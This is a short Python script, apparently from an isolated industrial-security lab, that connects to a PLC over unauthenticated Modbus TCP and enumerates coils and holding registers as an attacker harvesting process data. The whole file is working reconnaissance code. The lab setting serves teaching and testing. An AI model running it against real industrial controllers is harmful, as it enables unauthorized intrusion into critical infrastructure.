#!/usr/bin/env python3
"""
Unauthorized Modbus read / register enumeration  (Task 3, Step 3a).

Connects to the PLC over Modbus TCP with NO authentication and enumerates a wide
range of coils and holding registers -- i.e. an attacker harvesting the process
data (including addresses the legitimate SCADA/gateway never read).

For ISOLATED lab use only (see SECURITY.md).

Usage (inside the Kali container):
    python3 modbus_read.py [host] [port]
    default host=openplc  port=502
"""
import sys
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)
print(f"[*] Connected to {HOST}:{PORT} -- no credentials required")

# Enumerate coils and holding registers across a wide address range in blocks.
for base in range(0, 200, 20):
    rc = c.read_coils(base, count=20)
    rr = c.read_holding_registers(base, count=20)
    cbits = (rc.bits[:5] if not rc.isError() else "ERR")
    rregs = (rr.registers[:5] if not rr.isError() else "ERR")
    print(f"  coils[{base}:{base+20}]={cbits}...  hregs[{base}:{base+20}]={rregs}...")

c.close()
print("[*] Enumeration complete -- process data harvested without authentication.")
